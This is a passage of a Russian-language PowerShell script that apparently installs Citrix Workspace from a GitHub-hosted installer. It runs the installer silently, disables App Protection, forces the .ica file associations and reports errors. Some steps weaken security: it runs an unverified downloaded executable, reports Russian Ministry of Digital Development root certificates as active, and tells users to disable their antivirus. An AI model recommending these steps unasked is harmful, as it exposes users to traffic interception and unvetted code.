            } catch {
                Write-Host "   [-] Ошибка скачивания: $_" -ForegroundColor Red
            }
        }

        if (-not $downloadSuccess) {
            Write-Host "[-] ОШИБКА: Не удалось загрузить дистрибутив Citrix с GitHub!" -ForegroundColor Red
            Write-Host "    Проверьте интернет-соединение или наличие релиза по ссылке." -ForegroundColor Yellow
            Read-Host "Нажмите Enter для выхода..."
            exit
        }

        Write-Host "   [OK] Дистрибутив успешно сохранен ($([math]::Round((Get-Item $TempInstallerPath).Length / 1MB)) МБ)." -ForegroundColor Green
    } else {
        Write-Host "[6/7] Дистрибутив уже загружен ранее ($([math]::Round((Get-Item $TempInstallerPath).Length / 1MB)) МБ), повторное скачивание не требуется." -ForegroundColor Green
    }

    # 4. Установка чистого клиента
    Write-Host "[7/7] Запуск чистой установки Citrix Workspace..." -ForegroundColor Yellow
    Write-Host "   • App Protection : ОТКЛЮЧЕН" -ForegroundColor Gray
    Write-Host "   • Single Sign-On : ОТКЛЮЧЕН" -ForegroundColor Gray
    Write-Host "   • Аналитика CEIP : ОТКЛЮЧЕНА" -ForegroundColor Gray
    Write-Host "   Пожалуйста, подождите 1-3 минуты..." -ForegroundColor Gray

    Unblock-File -Path $TempInstallerPath -ErrorAction SilentlyContinue

    $args = "/silent /noreboot /forceinstall /includeSSON=false /includeappprotection=false /EnableCEIP=false /AutoUpdateCheck=disabled"
    $instProc = Start-Process -FilePath $TempInstallerPath -ArgumentList $args -PassThru

    Write-Host "   Идет процесс установки" -NoNewline
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $maxWaitSec = 300 # максимум 5 минут
    $installedSuccessfully = $false
    $detectedVer = $null

    while ($sw.Elapsed.TotalSeconds -lt $maxWaitSec) {
        Start-Sleep -Seconds 3
        Write-Host "." -NoNewline

        # Проверка наличия исполняемого файла wfica32.exe
        $wfica = @(
            "${env:ProgramFiles(x86)}\Citrix\ICA Client\wfica32.exe",
            "${env:ProgramFiles}\Citrix\ICA Client\wfica32.exe"
        ) | Where-Object { Test-Path $_ } | Select-Object -First 1

        if ($wfica) {
            $verInfo = (Get-Item $wfica).VersionInfo.ProductVersion
            if ($verInfo) { $detectedVer = $verInfo }
        }

        # Проверка регистрации в реестре
        $finalApp = Get-CitrixApp
        if ($finalApp -and $finalApp.DisplayVersion) {
            $detectedVer = $finalApp.DisplayVersion
        }

        # Проверяем, идут ли активные процессы инсталляции
        $activeInstallers = Get-Process -Name "msiexec", "TrolleyExpress", "CitrixWorkspaceApp", "CitrixWorkspaceFullInstaller" -ErrorAction SilentlyContinue

        if ($detectedVer) {
            if (-not $activeInstallers) {
                Start-Sleep -Seconds 3
                $installedSuccessfully = $true
                break
            }
        }

        if ($instProc.HasExited -and -not $activeInstallers) {
            Start-Sleep -Seconds 4
            $finalApp = Get-CitrixApp
            if ($finalApp -and $finalApp.DisplayVersion) {
                $detectedVer = $finalApp.DisplayVersion
                $installedSuccessfully = $true
            }
            break
        }
    }
    Write-Host ""
    $exitCode = if ($instProc.HasExited) { $instProc.ExitCode } else { 0 }



    if ($installedSuccessfully) {
        # Принудительная многоуровневая привязка .ica файлов к Citrix (HKLM + HKCU + UserChoice)
        $wfica = @(
            "${env:ProgramFiles(x86)}\Citrix\ICA Client\wfica32.exe",
            "${env:ProgramFiles}\Citrix\ICA Client\wfica32.exe",
            "${env:ProgramFiles(x86)}\Citrix\ICA Client\wfcrun32.exe"
        ) | Where-Object { Test-Path $_ } | Select-Object -First 1

        if ($wfica) {
            try {
                Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.ica\UserChoice" -Force -ErrorAction SilentlyContinue
                
                @("HKLM:\SOFTWARE\Classes\.ica", "HKCU:\Software\Classes\.ica") | ForEach-Object {
                    if (-not (Test-Path $_)) { New-Item -Path $_ -Force -ErrorAction SilentlyContinue | Out-Null }
                    Set-ItemProperty -Path $_ -Name "(Default)" -Value "Citrix.ICAClientName" -Force -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path $_ -Name "Content Type" -Value "application/x-ica" -Force -ErrorAction SilentlyContinue
                }

                @("HKLM:\SOFTWARE\Classes\Citrix.ICAClientName\shell\open\command", "HKCU:\Software\Classes\Citrix.ICAClientName\shell\open\command") | ForEach-Object {
                    if (-not (Test-Path $_)) { New-Item -Path $_ -Recurse -Force -ErrorAction SilentlyContinue | Out-Null }
                    Set-ItemProperty -Path $_ -Name "(Default)" -Value "`"$wfica`" `"%1`"" -Force -ErrorAction SilentlyContinue
                }

                Start-Process -FilePath $wfica -ArgumentList "/setup" -Wait -ErrorAction SilentlyContinue

                cmd.exe /c "assoc .ica=Citrix.ICAClientName >nul 2>&1"
                cmd.exe /c "ftype Citrix.ICAClientName=`"$wfica`" `"%1`" >nul 2>&1"
            } catch {}
        }

        Write-Host ""
        Write-Host "=================================================================" -ForegroundColor Green
        Write-Host " [УСПЕХ] Чистый Citrix Workspace v$detectedVer установлен и готов к работе!" -ForegroundColor Green
        Write-Host " [OK] Сертификаты Минцифры РФ и Sectigo активны" -ForegroundColor Green
        Write-Host " [OK] Аудио и микрофон HDX настроены" -ForegroundColor Green
        Write-Host " [OK] Файлы .ica привязаны к Citrix" -ForegroundColor Green
        Write-Host "=================================================================" -ForegroundColor Green
        # Удаляем временную папку только после успешной установки
        Remove-Item -Path $TargetFolder -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        Write-Host ""
        Write-Host "[-] ОШИБКА: Citrix не смог зарегистрироваться в системе." -ForegroundColor Red
        if ($exitCode -eq 40017) {
            Write-Host "    [!] КОД 40017: ТРЕБУЕТСЯ ПЕРЕЗАГРУЗКА КОМПЬЮТЕРА!" -ForegroundColor Yellow
            Write-Host "    После удаления предыдущей версии системные драйверы заблокированы Windows." -ForegroundColor Yellow
            Write-Host "    (Дистрибутив сохранен на диске, заново скачивать 730 МБ не потребуется)." -ForegroundColor Cyan
            Write-Host ""
            Write-Host "    ДЕЙСТВИЕ: Перезагрузите компьютер и запустите команду еще раз!" -ForegroundColor Green
        } elseif ($exitCode -eq 1603) {
            Write-Host "    Код 1603 (Fatal Error): Установка заблокирована антивирусом 360 Total Security!" -ForegroundColor Red
            Write-Host "    Временно отключите защиту 360 в трее." -ForegroundColor Yellow
        } else {
            Write-Host "    Код выхода: $exitCode. Проверьте карантин/журнал антивируса." -ForegroundColor Yellow
        }

        # Проверка и вывод последних строк лога Citrix
        $logFiles = Get-ChildItem -Path "$env:TEMP", "$env:LOCALAPPDATA\Citrix" -Recurse -ErrorAction SilentlyContinue | 
            Where-Object { ($_.Name -match "Citrix|TrolleyExpress|CTX|Receiver|wfica") -and ($_.Name -match "\.log$") -and ($_.Name -notmatch "Adobe|CCLibrary") } | 
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
        if ($logFiles) {
            Write-Host ""
            Write-Host "    Строки из лога инсталлятора ($($logFiles.Name)):" -ForegroundColor DarkGray
            Get-Content -Path $logFiles.FullName -Tail 6 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "      $_" -ForegroundColor DarkGray }
        }

        if (Test-Path $TempInstallerPath) {
            Write-Host ""
            Write-Host "Хотите запустить установку в обычном окне мастера (GUI)? (Y/N): " -ForegroundColor Cyan -NoNewline
            $reply = Read-Host
            if ($reply -match "^[yydд]$") {
                Start-Process -FilePath $TempInstallerPath -ArgumentList "/noreboot"
            }
        }
    }
}

Write-Host ""
Write-Host "Операция завершена. Нажмите Enter для выхода..." -ForegroundColor Gray
Read-Host
